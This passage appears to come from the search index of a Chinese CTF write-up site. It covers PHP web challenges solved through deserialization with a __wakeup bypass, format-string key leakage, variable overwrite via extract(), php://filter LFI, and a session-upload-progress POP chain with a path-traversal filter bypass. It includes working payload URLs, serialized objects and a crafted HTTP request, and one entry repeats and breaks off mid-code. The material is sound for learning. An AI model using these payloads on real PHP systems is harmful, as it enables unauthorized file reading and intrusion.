)===FALSE stripos($f, / )===FALSE stripos($f, \\\\ )===FALSE stripos($f, flag )===FALSE) { readfile($f); } else { echo File not found! ; } } ? \u53d1\u73b0 flag \u88ab\u8fc7\u6ee4\u4e86\uff0c\u800c\u4e14 / \u4e5f\u88ab\u7ed5\u8fc7\u4e86\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u4e4b\u524d\u4f7f\u7528 php://filter \u51fa\u9519\u7684\u539f\u56e0\u3002 \u5c1d\u8bd5\u7ed5\u8fc7\uff0c\u4e0d\u8fc7\u8fc7\u6ee4\u6bd4\u8f83\u4e25\u683c\uff0c\u7ed5\u8fc7\u6709\u70b9\u96be\u5ea6\uff0c\u8f6c\u800c\u5206\u6790\u5176\u4ed6\u4e24\u4e2a\u6587\u4ef6\u3002","title":"Get Source"},{"location":"web/PHP/ichunqiuCTF_easyphp/#unserialize","text":"\u6d89\u53ca\u5230**\u53cd\u5e8f\u5217\u5316**\uff1a $x = unserialize($g); ,\u53d1\u73b0\u5728hint.php\u4e2d function __destruct() { if(!empty($this- file)) { if(strchr($this- file, \\\\ )===false strchr($this- file, / )===false) show_source(dirname (__FILE__). / .$this - file); else die( Wrong filename. ); } } \u5b58\u5728\u6587\u4ef6\u8bfb\u53d6\uff0c\u53ef\u4ee5\u6784\u9020**Payload**\u4f7f\u5f97 $this- file = \"flag.php\" \uff0c\u7531 ?php error_reporting(0); //flag is in flag.php class hint{ public $file= ; function __destruct(){ if(!empty($this- file)) { if(strchr($this- file, \\\\ )===false strchr($this- file, / )===false) show_source(dirname (__FILE__). / .$this - file); else die( Wrong filename. ); }} function __wakeup(){ $this- file= index.php ; } public function __toString(){return ;} } $a = new hint(); $a- file = flag.php ; echo serialize($a); \u5f97\u5230\u5b57\u7b26\u4e32 O:4:\"hint\":1:{s:4:\"file\";s:8:\"flag.php\";} \uff0c\u4f46\u662f\u8fd9\u6837\u5e76\u4e0d\u80fd\u8bfb\u53d6\u5230flag.php\u6587\u4ef6\uff0c\u56e0\u4e3a\u5728\u5e8f\u5217\u5316\u65f6\uff0c __wakeup() \u51fd\u6570\u53c8\u4f1a\u5c06 \"index.php\" \u8d4b\u503c\u7ed9 $this- file . \u8fd9\u91cc\u6d89\u53ca\u7684\u53e6\u4e00\u4e2a\u77e5\u8bc6\uff0c\u662fphp\u672c\u8eab\u7684\u4e00\u4e2abug\uff0c\u8be6\u7ec6\u4fe1\u606f\u53ef\u4ee5\u67e5\u8be2 php bug 72663 \uff0c\u8fd9\u4e2a bug \u7684\u539f\u7406\u662f\uff1a\u5f53\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u4e2d\uff0c\u8868\u793a**\u5c5e\u6027\u4e2a\u6570\u7684\u503c\u5927\u4e8e\u771f\u5b9e\u5c5e\u6027\u4e2a\u6570**\u65f6\uff0c\u4f1a\u8df3\u8fc7 __wakeup \u51fd\u6570\u7684\u6267\u884c\u3002 \u4e8e\u662f\u5c06hint\u503c\u6539\u4e3a2 Payload\uff1a http://120.55.43.255:13005/index.php?class=O:4: hint :2:{s:4: file ;s:8: flag.php ;}","title":"Unserialize"},{"location":"web/PHP/ictf_best_language1/","text":"ictf_best_language1_writeup \u7b2c\u4e00\u6b65\u3001\u4ee3\u7801\u5ba1\u8ba1 \u8fd9\u6b21i\u6625\u79cb\u4e3e\u529e\u7684ictf\u662f\u4e00\u573a\u4ee5\u7ec3\u4e60\u4e3a\u4e3b\u7684ctf\u7ade\u8d5b\uff0c\u5f88\u591a\u9898\u76ee\u8fd8\u662f\u5f88\u4e0d\u9519\u7684\uff0c\u5176\u4e2d\u8fd9\u4e00\u9053\u6e90\u7801\u5ba1\u8ba1\u7684\u9898\u76ee\u6211\u8ba4\u4e3a\u5f88\u6709\u610f\u601d\uff0c\u6db5\u76d6\u4e86\u53d8\u91cf\u8986\u76d6\uff0c\u53cd\u5e8f\u5217\u5316\uff0c\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0c\u4ee5\u53casession.upload_progress.enabled\u7684\u77e5\u8bc6\u70b9\uff0c\u662f\u4e00\u9053\u5f88\u6709\u610f\u601d\u7684\u9898\u76ee\uff0c\u4ee5\u4e0b\u662f\u8be6\u7ec6\u89e3\u9898\u8fc7\u7a0b\uff1a ?php error_reporting(0); highlight_file(__FILE__); include( secret_key.php ); if(!empty($_GET[ name ])) { $arr = array($_GET[ name ],$secret_key); $data = Welcome my friend %s ; foreach ($arr as $k = $v) { $data = sprintf($data,$v); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\uff08\u6211\u4e5f\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u53eb\u8fd9\u4e2a\uff09\uff0c\u8f93\u5165\u7684name\u4e3a%s\u5c31\u80fd\u8bfb\u53d6\u5230\u79d8\u94a5 th3_k3y_y0u_cann0t_guess2333 } echo $data; } if( ($secret_key) === $_GET[ key ]){ echo you get the key ; $first= aa ; $ccc= amdin ; $i=1; foreach($_GET as $key = $value) { if($i===1) { $i++; $$key = $value; //\u53d8\u91cf\u8986\u76d6\uff0c\u4f46\u662f\u53ea\u80fd\u8986\u76d6\u4e00\u4e2a\uff0c\u6240\u4ee5\u6211\u4eec\u628afirst\u653eGET\u53c2\u6570\u7b2c\u4e00\u4e2a\uff0c\u8d4b\u503c\u4e3a u } else{break;} } if($first=== u ) { echo shi fu 666 ; $file= phpinfo.php ; $func = $_GET[ function ]; call_user_func($func,$_GET); //\u6765\u4e2a\u53d8\u91cf\u8986\u76d6\u51fd\u6570 extract \u7136\u540e\u628accc\u8d4b\u503c\u4e3aF1ag \u6ce8\u610f\uff1a\u7531\u4e8e\u540e\u9762\u6709include,\u6240\u4ee5\u6211\u4eec\u8fd8\u53ef\u4ee5\u6539$file\u53c2\u6570\uff0c\u53ef\u4ee5\u5229\u7528LFI\u8bfb\u53d6\u5230class.php\u7684\u6e90\u7801 \u8fd8\u6709call_user_func\u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u51fd\u6570\u540d\uff0c\u7b2c\u4e8c\u4e2a\u662f\u4f20\u5165\u7684\u53c2\u6570\uff0c\u4f46\u662f\u53ea\u80fd\u4f20\u4e00\u4e2a\u53c2\u6570\uff0c\u4f20\u591a\u4e2a\u53c2\u6570\u4f7f\u7528call_user_func_array if($ccc=== F1ag ) { echo tqltqltqltqltql ; require( class.php ); include($file); } } else { echo Can you hack me? ; } } \u8fd9\u4e00\u6bb5\u4ee3\u7801\u4e2d\u9700\u8981\u5229\u7528\u7684\u51e0\u4e2a\u77e5\u8bc6\u70b9\uff1a $data = sprintf($data,$v); \u8fd9\u4e00\u53e5\u662f\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\uff08\u6211\u4e5f\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u53eb\u8fd9\u4e2a\uff09\uff0c\u8f93\u5165\u7684name\u4e3a%s\u5c31\u80fd\u8bfb\u53d6\u5230\u79d8\u94a5 th3_k3y_y0u_cann0t_guess2333 $$key = $value; \u5b58\u5728\u53d8\u91cf\u8986\u76d6\u6f0f\u6d1e\uff0c\u4f46\u662f\u6839\u636e\u4e0a\u4e0b\u6587\u53ea\u80fd\u8986\u76d6\u4e00\u4e2a\u53d8\u91cf\uff0c\u6240\u4ee5\u6211\u4eec\u628afirst\u653eGET\u53c2\u6570\u7b2c\u4e00\u4e2a\uff0c\u8d4b\u503c\u4e3a u call_user_func($func,$_GET); \u8fd9\u4e2a\u5730\u65b9\u53ef\u4ee5\u8c03\u7528\u51fd\u6570\uff0c\u7531\u4e8e\u9700\u8981\u6ee1\u8db3\u540e\u9762\u7684 if($ccc===\"F1ag\") \uff0c\u6240\u4ee5\u6211\u4eec\u8c03\u7528\u5177\u6709\u53d8\u91cf\u8986\u76d6\u6f0f\u6d1e\u7684\u51fd\u6570 extract() \uff0c\u7136\u540e\u5c06ccc\u8d4b\u503c\u4e3aF1ag\uff0c \u5176\u4e2dcall_user_func\u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u51fd\u6570\u540d\uff0c\u7b2c\u4e8c\u4e2a\u662f\u4f20\u5165\u7684\u53c2\u6570\uff0c\u4f46\u662f\u53ea\u80fd\u4f20\u4e00\u4e2a\u53c2\u6570\uff0c\u4f20\u591a\u4e2a\u53c2\u6570\u4f7f\u7528call_user_func_array \u6ce8\u610f\uff1a\u7531\u4e8e\u540e\u9762\u6709include,\u6240\u4ee5\u6211\u4eec\u8fd8\u53ef\u4ee5\u6539$file\u53c2\u6570\uff0c\u53ef\u4ee5\u5229\u7528LFI\u8bfb\u53d6\u5230class.php\u7684\u6e90\u7801 \u8fd9\u91cc\u90fd\u6709LFI\u4e86\uff0c\u5e94\u8be5\u53ef\u4ee5getshell\u624d\u5bf9\uff0c\u901a\u8fc7\u5305\u542b\uff1a/proc/self/environ \u6216\u8005\u65e5\u5fd7\u6587\u4ef6\u3002\u3002\u3002\u4f46\u662f\u90fd\u6ca1\u6709\u6743\u9650\uff0c\u751a\u81f3/etc/passwd\u4e5f\u8bfb\u4e0d\u5230 \u7531\u4e8e\u6709 require('class.php'); \u7684\u4e00\u53e5\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u901a\u8fc7php\u4f2a\u534f\u8bae\u8bfb\u53d6class.php\u7684\u6e90\u7801\uff0cpayload\u5982\u4e0b: http://120.55.43.255:13006/?first=u name=%s key=th3_k3y_y0u_cann0t_guess2333 function=extract ccc=F1ag file=php://filter/read=convert.base64-encode/resource=class.php \u6e90\u7801\u5982\u4e0b: ?php ini_set( session.serialize_handler , php ); session_start(); class Monitor { public $test; function __construct() { $this- test = index.php ; } function __destruct() { echo file: .$this- test. ; } } class Welcome { public $obj; public $var; function __construct(){ $this- var= success ; $this- obj=null; } function __toString(){ $this- obj- execute(); return $this- var. ; } } class Come{ public $method; public $args; function __construct($method, $args) { $this- method = $method; $this- args = $args; } function __wakeup(){ foreach($this- args as $k = $v) { $this- args[$k] = $this- waf(trim($v)); } } function waf($str){ $str=preg_replace( /[ *;|?\\n ]/ , ,$str); $str=str_replace( /../ , ,$str); $str=str_replace( ../ , ,$str); return $str; } function get_dir($path){ print_r(scandir( /tmp .$path)); } function execute() { if (in_array($this- method, array( get_dir ))) { call_user_func_array(array($this, $this- method), ($this- args)); //call_user_func_array\u51fd\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e5f\u662f\u4f20\u51fd\u6570\u540d\uff0c\u800c\u8fd9\u4e2a\u4f20\u6570\u7ec4\u5c31\u662farray($this, $this- method)\u8868\u793a$this::method\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4ee5\u6570\u7ec4\u7684\u5f62\u5f0f\u4f20\u5165\u591a\u4e2a\u53c2\u6570 } } } ? \u77e5\u8bc6\u70b9\uff1a ini_set('session.serialize_handler', 'php'); \uff0c\u8fd9\u4e2a\u663e\u7136\u4e0esession\u8bbe\u7f6e\u6709\u5173\uff0c\u7531phpinfo()\u9875\u9762\u77e5\uff0c session.upload_progress.enabled \u4e3aOn\u3002\u5f53\u4e00\u4e2a\u4e0a\u4f20\u5728\u5904\u7406\u4e2d\uff0c\u540c\u65f6POST\u4e00\u4e2a\u4e0eINI\u4e2d\u8bbe\u7f6e\u7684 session.upload_progress.name \u540c\u540d\u53d8\u91cf\u65f6\uff0c\u5f53PHP\u68c0\u6d4b\u5230\u8fd9\u79cdPOST\u8bf7\u6c42\u65f6\uff0c\u5b83\u4f1a\u5728 $_SESSION \u4e2d\u6dfb\u52a0\u4e00\u7ec4\u6570\u636e\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7 Session Upload Progress \u6765\u8bbe\u7f6esession\u3002 \u56e0\u6b64\u6211\u4eec\u6784\u9020\u8868\u5355 html head title upload /title /head body form action= http://120.55.43.255:13006/ method= POST enctype= multipart/form-data input type= hidden name= PHP_SESSION_UPLOAD_PROGRESS value= 1 / input type= file name= file / input type= submit / /form /body /html \u6ce8\u610f\uff0c\u8fd9\u4e2a\u5f04\u51fa\u6765\u7684HTTP\u5934\u5c11\u4e86\u4e00\u4e2aAccept-Encoding\uff0c\u9700\u8981\u52a0\u4e0a\u5934\u90e8\u5b57\u6bb5\uff1aAccept-Encoding: gzip, deflate \u7136\u540e\u5f97\u5230http\u8bf7\u6c42\u5934\u4e3a\uff1a POST /class.php HTTP/1.1 Host: 120.55.43.255:13006 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------57052814523281 Content-Length: 714 Connection: close Cookie: PHPSESSID=6o6k31opf8h9cmeb60mu2gaac1 Upgrade-Insecure-Requests: 1 -----------------------------57052814523281 Content-Disposition: form-data; name= PHP_SESSION_UPLOAD_PROGRESS 123 -----------------------------57052814523281 Content-Disposition: form-data; name= file ; filename= 123 //\u8fd9\u4e2afilename\u5c31\u662f\u6211\u4eec\u8981\u53cd\u5e8f\u5217\u5316\u7684\u5730\u65b9 Content-Type: text/plain wewetert -----------------------------57052814523281-- \u5176\u4e2d\u7b2c\u4e8c\u4e2afilename\u53d8\u91cf\u5c31\u662f\u6211\u4eec\u8981\u586b\u5199\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u7684\u5730\u65b9 \u8fd9\u4e2a\u5e8f\u5217\u5316\u5982\u4f55\u6784\u9020\u5462\uff1f ?php ini_set( session.serialize_handler , php ); session_start(); class Monitor { public $test; function __construct() { $this- test =new Welcome(); } function __destruct() { echo file: .$this- test. ; } } class Welcome { public $obj; public $var; function __construct(){ $this- var= {$_GET} ; $this- obj=new Come( get_dir ,array( /....//var/www/html )); } function __toString(){ $this- obj- execute(); return $this- var. ; } } class Come{ public $method; public $args; function __construct($method, $args) { $this- method = $method; $this- args = $args; } function __wakeup(){ foreach($this- args as $k = $v) { $this- args[$k] = $this- waf(trim($v)); } } function waf($str){ $str=preg_replace( /[ *;|?\\n ]/ , ,$str); $str=str_replace( /../ , ,$str); $str=str_replace( ../ , ,$str); return $str; } function get_dir($path){ print_r(scandir( /tmp .$path)); } function execute() { if (in_array($this- method, array( get_dir ))) { call_user_func_array(array($this, $this- method), ($this- args)); } } } $c = new Monitor(); $d= str_replace( , \\\\ , serialize($c)); var_dump($d); ? \u6ce8\u610f\u4e24\u4e2a\u5730\u65b9\uff1a 1. $this- test =new Welcome(); \uff0c\u8fd9\u4e2a\u53cd\u5e8f\u5217\u5316\u7684\u5229\u7528\u903b\u8f91\u5c31\u662f\u901a\u8fc7 Monitor \u7c7b\u7684 __destruct \u65b9\u6cd5\u8c03\u7528\u5230 Welcome \u7c7b\u7684 __toString \u65b9\u6cd5\uff0c\u518d\u8c03\u7528\u5230 Come \u7c7b\u7684 execute \u65b9\u6cd5\uff0c\u8fbe\u5230\u6267\u884c\u51fd\u6570\u7684\u76ee\u7684\uff0c\u5176\u4e2d\uff0c execute \u65b9\u6cd5\u4e2d\uff0c\u7531\u4e8e\u662f $this- method \uff0c\u6240\u4ee5\u53ea\u80fd\u8c03\u7528\u7c7b\u7684\u65b9\u6cd5\uff0c\u4e0d\u80fd\u968f\u4fbf\u8c03\u7528\u7cfb\u7edf\u51fd\u6570\uff0c\u4e5f\u5c31\u662f get_dir \u65b9\u6cd5\u3002 2. $this- obj=new Come('get_dir',array('/....//var/www/html')); \u8fd9\u91cc\u4e3b\u8981\u4e24\u70b9\uff0c\u9996\u5148\u662f\u8def\u5f84\u5fc5\u987b\u4ee5\u6570\u7ec4\u7684\u5f62\u5f0f\u4f20\uff0c\u56e0\u4e3a call_user_func_array \u51fd\u6570\u8981\u6c42\u4f20\u5165\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\uff0c\u5176\u6b21\u662f\u7ed5\u8fc7waf\uff0c\u8fd9\u4e2awaf\u592a\u597d\u7ed5\u8fc7\u4e86\uff0c\u56e0\u4e3a\u8fd9\u79cd\u5229\u7528\u4e24\u4e2a str_replace() \u7684waf\uff0c\u901a\u5e38\u53ef\u4ee5\u5229\u7528\u540e\u4e00\u4e2a\u6765\u7ed5\u8fc7\u524d\u4e00\u4e2a\uff0c\u6240\u4ee5/....//\u5c31\u4f1a\u53d8\u6210/../\u5c31\u53ef\u4ee5\u8df3\u5230\u4e0a\u4e00\u76ee\u5f55\u4e86 \u4ece\u800c\u5f97\u5230payload: O:7:\\ Monitor\\ :1:{s:4:\\ test\\ ;O:7:\\ Welcome\\ :2:{s:3:\\ obj\\ ;O:4:\\ Come\\ :2:{s:6:\\ method\\ ;s:7:\\ get_dir\\ ;s:4:\\ args\\ ;a:1:{i:0;s:19:\\ /....//var/www/html\\ ;}}s:3:\\ var\\ ;s:7:\\ {$_GET}\\ ;}} \u4e5f\u662f\u8981\u6ce8\u610f\uff0c\u91cc\u9762\u7684\u53cc\u5f15\u53f7\u524d\u9762\u8bb0\u5f97\u52a0\u4e0a\\\u4f5c\u4e3a\u8f6c\u4e49\u7b26\uff0c\u5e76\u4e14\u6700\u524d\u9762\u7684O\u4e4b\u524d\u9700\u8981\u52a0\u4e00\u4e2a | ,\u8fd9\u90fd\u662fphp_session\u53cd\u5e8f\u5217\u5316\u7684\u683c\u5f0f \u6700\u540e\u8bf4\u4e00\u70b9\uff0c\u8fd9\u9898\u76ee\u6743\u9650\u7ed9\u7684\u5f88\u4f4e\uff0c\u6211\u5f53\u65f6\u8bfb\u53d6\u6839\u76ee\u5f55\u90fd\u65e0\u6cd5\u8bfb\u53d6\uff0c\u6574\u4e2a\u7cfb\u7edf\u4f3c\u4e4e\u5c31/tmp\u4e0e/var/www/html\u6709\u8bfb\u6743\u9650\uff0c\u8fd9\u5176\u5b9e\u633a\u5751\u7684\u3002\u3002\u5bb3\u5f97\u6211\u4e00\u5ea6\u6000\u7591\u4eba\u751f\u3002 \u6709\u4e00\u8bf4\u4e00\uff0c\u8fd9\u4e2a\u9898\u62ff\u6765\u7ec3\u4e60\u505a\u597d\u4e0d\u8fc7\u4e86\uff0c\u51c6\u5907\u7b49\u5b66\u5f1f\u5b66\u53cd\u5e8f\u5217\u5316\u4e86\uff0c\u8003\u8003\u4ed6\u4eec(\u6211\u771f\u8fc7\u5206)\u3002","title":"ictf_best_language1"},{"location":"web/PHP/ictf_best_language1/#ictf_best_language1_writeup","text":"\u7b2c\u4e00\u6b65\u3001\u4ee3\u7801\u5ba1\u8ba1 \u8fd9\u6b21i\u6625\u79cb\u4e3e\u529e\u7684ictf\u662f\u4e00\u573a\u4ee5\u7ec3\u4e60\u4e3a\u4e3b\u7684ctf\u7ade\u8d5b\uff0c\u5f88\u591a\u9898\u76ee\u8fd8\u662f\u5f88\u4e0d\u9519\u7684\uff0c\u5176\u4e2d\u8fd9\u4e00\u9053\u6e90\u7801\u5ba1\u8ba1\u7684\u9898\u76ee\u6211\u8ba4\u4e3a\u5f88\u6709\u610f\u601d\uff0c\u6db5\u76d6\u4e86\u53d8\u91cf\u8986\u76d6\uff0c\u53cd\u5e8f\u5217\u5316\uff0c\u672c\u5730\u6587\u4ef6\u5305\u542b\uff0c\u4ee5\u53casession.upload_progress.enabled\u7684\u77e5\u8bc6\u70b9\uff0c\u662f\u4e00\u9053\u5f88\u6709\u610f\u601d\u7684\u9898\u76ee\uff0c\u4ee5\u4e0b\u662f\u8be6\u7ec6\u89e3\u9898\u8fc7\u7a0b\uff1a ?php error_reporting(0); highlight_file(__FILE__); include( secret_key.php ); if(!empty($_GET[ name ])) { $arr = array($_GET[ name ],$secret_key); $data = Welcome my friend %s ; foreach ($arr as $k = $v) { $data = sprintf($data,$v); //\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\uff08\u6211\u4e5f\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u53eb\u8fd9\u4e2a\uff09\uff0c\u8f93\u5165\u7684name\u4e3a%s\u5c31\u80fd\u8bfb\u53d6\u5230\u79d8\u94a5 th3_k3y_y0u_cann0t_guess2333 } echo $data; } if( ($secret_key) === $_GET[ key ]){ echo you get the key ; $first= aa ; $ccc= amdin ; $i=1; foreach($_GET as $key = $value) { if($i===1) { $i++; $$key = $value; //\u53d8\u91cf\u8986\u76d6\uff0c\u4f46\u662f\u53ea\u80fd\u8986\u76d6\u4e00\u4e2a\uff0c\u6240\u4ee5\u6211\u4eec\u628afirst\u653eGET\u53c2\u6570\u7b2c\u4e00\u4e2a\uff0c\u8d4b\u503c\u4e3a u } else{break;} } if($first=== u ) { echo shi fu 666 ; $file= phpinfo.php ; $func = $_GET[ function ]; call_user_func($func,$_GET); //\u6765\u4e2a\u53d8\u91cf\u8986\u76d6\u51fd\u6570 extract \u7136\u540e\u628accc\u8d4b\u503c\u4e3aF1ag \u6ce8\u610f\uff1a\u7531\u4e8e\u540e\u9762\u6709include,\u6240\u4ee5\u6211\u4eec\u8fd8\u53ef\u4ee5\u6539$file\u53c2\u6570\uff0c\u53ef\u4ee5\u5229\u7528LFI\u8bfb\u53d6\u5230class.php\u7684\u6e90\u7801 \u8fd8\u6709call_user_func\u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u51fd\u6570\u540d\uff0c\u7b2c\u4e8c\u4e2a\u662f\u4f20\u5165\u7684\u53c2\u6570\uff0c\u4f46\u662f\u53ea\u80fd\u4f20\u4e00\u4e2a\u53c2\u6570\uff0c\u4f20\u591a\u4e2a\u53c2\u6570\u4f7f\u7528call_user_func_array if($ccc=== F1ag ) { echo tqltqltqltqltql ; require( class.php ); include($file); } } else { echo Can you hack me? ; } } \u8fd9\u4e00\u6bb5\u4ee3\u7801\u4e2d\u9700\u8981\u5229\u7528\u7684\u51e0\u4e2a\u77e5\u8bc6\u70b9\uff1a $data = sprintf($data,$v); \u8fd9\u4e00\u53e5\u662f\u6709\u683c\u5f0f\u5316\u5b57\u7b26\u4e32\u6f0f\u6d1e\u7684\uff08\u6211\u4e5f\u4e0d\u77e5\u9053\u662f\u4e0d\u662f\u53eb\u8fd9\u4e2a\uff09\uff0c\u8f93\u5165\u7684name\u4e3a%s\u5c31\u80fd\u8bfb\u53d6\u5230\u79d8\u94a5 th3_k3y_y0u_cann0t_guess2333 $$key = $value; \u5b58\u5728\u53d8\u91cf\u8986\u76d6\u6f0f\u6d1e\uff0c\u4f46\u662f\u6839\u636e\u4e0a\u4e0b\u6587\u53ea\u80fd\u8986\u76d6\u4e00\u4e2a\u53d8\u91cf\uff0c\u6240\u4ee5\u6211\u4eec\u628afirst\u653eGET\u53c2\u6570\u7b2c\u4e00\u4e2a\uff0c\u8d4b\u503c\u4e3a u call_user_func($func,$_GET); \u8fd9\u4e2a\u5730\u65b9\u53ef\u4ee5\u8c03\u7528\u51fd\u6570\uff0c\u7531\u4e8e\u9700\u8981\u6ee1\u8db3\u540e\u9762\u7684 if($ccc===\"F1ag\") \uff0c\u6240\u4ee5\u6211\u4eec\u8c03\u7528\u5177\u6709\u53d8\u91cf\u8986\u76d6\u6f0f\u6d1e\u7684\u51fd\u6570 extract() \uff0c\u7136\u540e\u5c06ccc\u8d4b\u503c\u4e3aF1ag\uff0c \u5176\u4e2dcall_user_func\u51fd\u6570\uff0c\u7b2c\u4e00\u4e2a\u662f\u51fd\u6570\u540d\uff0c\u7b2c\u4e8c\u4e2a\u662f\u4f20\u5165\u7684\u53c2\u6570\uff0c\u4f46\u662f\u53ea\u80fd\u4f20\u4e00\u4e2a\u53c2\u6570\uff0c\u4f20\u591a\u4e2a\u53c2\u6570\u4f7f\u7528call_user_func_array \u6ce8\u610f\uff1a\u7531\u4e8e\u540e\u9762\u6709include,\u6240\u4ee5\u6211\u4eec\u8fd8\u53ef\u4ee5\u6539$file\u53c2\u6570\uff0c\u53ef\u4ee5\u5229\u7528LFI\u8bfb\u53d6\u5230class.php\u7684\u6e90\u7801 \u8fd9\u91cc\u90fd\u6709LFI\u4e86\uff0c\u5e94\u8be5\u53ef\u4ee5getshell\u624d\u5bf9\uff0c\u901a\u8fc7\u5305\u542b\uff1a/proc/self/environ \u6216\u8005\u65e5\u5fd7\u6587\u4ef6\u3002\u3002\u3002\u4f46\u662f\u90fd\u6ca1\u6709\u6743\u9650\uff0c\u751a\u81f3/etc/passwd\u4e5f\u8bfb\u4e0d\u5230 \u7531\u4e8e\u6709 require('class.php'); \u7684\u4e00\u53e5\uff0c\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u901a\u8fc7php\u4f2a\u534f\u8bae\u8bfb\u53d6class.php\u7684\u6e90\u7801\uff0cpayload\u5982\u4e0b: http://120.55.43.255:13006/?first=u name=%s key=th3_k3y_y0u_cann0t_guess2333 function=extract ccc=F1ag file=php://filter/read=convert.base64-encode/resource=class.php \u6e90\u7801\u5982\u4e0b: ?php ini_set( session.serialize_handler , php ); session_start(); class Monitor { public $test; function __construct() { $this- test = index.php ; } function __destruct() { echo file: .$this- test. ; } } class Welcome { public $obj; public $var; function __construct(){ $this- var= success ; $this- obj=null; } function __toString(){ $this- obj- execute(); return $this- var. ; } } class Come{ public $method; public $args; function __construct($method, $args) { $this- method = $method; $this- args = $args; } function __wakeup(){ foreach($this- args as $k = $v) { $this- args[$k] = $this- waf(trim($v)); } } function waf($str){ $str=preg_replace( /[ *;|?\\n ]/ , ,$str); $str=str_replace( /../ , ,$str); $str=str_replace( ../ , ,$str); return $str; } function get_dir($path){ print_r(scandir( /tmp .$path)); } function execute() { if (in_array($this- method, array( get_dir ))) { call_user_func_array(array($this, $this- method), ($this- args)); //call_user_func_array\u51fd\u6570\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e5f\u662f\u4f20\u51fd\u6570\u540d\uff0c\u800c\u8fd9\u4e2a\u4f20\u6570\u7ec4\u5c31\u662farray($this, $this- method)\u8868\u793a$this::method\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u4ee5\u6570\u7ec4\u7684\u5f62\u5f0f\u4f20\u5165\u591a\u4e2a\u53c2\u6570 } } } ? \u77e5\u8bc6\u70b9\uff1a ini_set('session.serialize_handler', 'php'); \uff0c\u8fd9\u4e2a\u663e\u7136\u4e0esession\u8bbe\u7f6e\u6709\u5173\uff0c\u7531phpinfo()\u9875\u9762\u77e5\uff0c session.upload_progress.enabled \u4e3aOn\u3002\u5f53\u4e00\u4e2a\u4e0a\u4f20\u5728\u5904\u7406\u4e2d\uff0c\u540c\u65f6POST\u4e00\u4e2a\u4e0eINI\u4e2d\u8bbe\u7f6e\u7684 session.upload_progress.name \u540c\u540d\u53d8\u91cf\u65f6\uff0c\u5f53PHP\u68c0\u6d4b\u5230\u8fd9\u79cdPOST\u8bf7\u6c42\u65f6\uff0c\u5b83\u4f1a\u5728 $_SESSION \u4e2d\u6dfb\u52a0\u4e00\u7ec4\u6570\u636e\u3002\u6240\u4ee5\u53ef\u4ee5\u901a\u8fc7 Session Upload Progress \u6765\u8bbe\u7f6esession\u3002 \u56e0\u6b64\u6211\u4eec\u6784\u9020\u8868\u5355 html head title upload /title /head body form action= http://120.55.43.255:13006/ method= POST enctype= multipart/form-data input type= hidden name= PHP_SESSION_UPLOAD_PROGRESS value= 1 / input type= file name= file / input type= submit / /form /body /html \u6ce8\u610f\uff0c\u8fd9\u4e2a\u5f04\u51fa\u6765\u7684HTTP\u5934\u5c11\u4e86\u4e00\u4e2aAccept-Encoding\uff0c\u9700\u8981\u52a0\u4e0a\u5934\u90e8\u5b57\u6bb5\uff1aAccept-Encoding: gzip, deflate \u7136\u540e\u5f97\u5230http\u8bf7\u6c42\u5934\u4e3a\uff1a POST /class.php HTTP/1.1 Host: 120.55.43.255:13006 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: multipart/form-data; boundary=---------------------------57052814523281 Content-Length: 714 Connection: close Cookie: PHPSESSID=6o6k31opf8h9cmeb60mu2gaac1 Upgrade-Insecure-Requests: 1 -----------------------------57052814523281 Content-Disposition: form-data; name= PHP_SESSION_UPLOAD_PROGRESS 123 -----------------------------57052814523281 Content-Disposition: form-data; name= file ; filename= 123 //\u8fd9\u4e2afilename\u5c31\u662f\u6211\u4eec\u8981\u53cd\u5e8f\u5217\u5316\u7684\u5730\u65b9 Content-Type: text/plain wewetert -----------------------------57052814523281-- \u5176\u4e2d\u7b2c\u4e8c\u4e2afilename\u53d8\u91cf\u5c31\u662f\u6211\u4eec\u8981\u586b\u5199\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u7684\u5730\u65b9 \u8fd9\u4e2a\u5e8f\u5217\u5316\u5982\u4f55\u6784\u9020\u5462\uff1f ?php ini_set( session.serialize_handler , php ); session_start(); class Monitor { public $test; function __construct() { $this- test =new Welcome(); } function __destruct() { echo file: .$this- test. ; } } class Welcome { public $obj; public $var; function __construct(){ $this- var= {$_GET} ; $this- obj=new Come( get_dir ,array( /....//var/www/html )); } function __toString(){ $this- obj- execute(); return $this- var. ; } } class Come{ public $method; public $args; function __construct($method, $args) { $this- method = $method; $this- args = $args; } function __wakeup(){ foreach($this- args as $k = $v) { $this- args[$k] = $this- waf(trim($v)); } } function waf($str){ $str=preg_replace( /[ *;|?\\n ]/ , ,$str); $str=str_replace( /../ , ,$str); $str=str_replace( 